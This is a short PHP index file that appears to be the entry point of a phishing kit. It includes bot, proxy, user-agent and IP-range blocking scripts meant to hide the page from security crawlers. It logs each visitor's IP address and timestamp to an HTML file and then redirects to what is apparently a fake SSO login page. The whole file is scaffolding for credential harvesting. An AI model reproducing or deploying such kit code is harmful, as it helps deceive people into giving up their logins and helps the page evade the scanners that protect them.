<?php
/* START BLOCKING FUNCTIONS WITH FILES XT3R */
include 'sso/T3R/proxyblock.php';
include 'sso/T3R/bot.php';
include 'sso/T3R/usera.php';
include 'sso/T3R/rangip.php';

 ob_start();
 
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set("Asia/Manila");
$date = gmdate ("Y/m/d");
$dateHis = gmdate ("H:i:sa");
$seen = "<font color='#A52A2A' size='2'>| IP Address : ".$ip." | Date : ".$date." @ ".$dateHis." |</font><br>";
$flogs = fopen("./sso/lib/visit.html","a");
fwrite($flogs, $seen);
fclose($flogs);

header("location: sso/login.php");
exit();
?>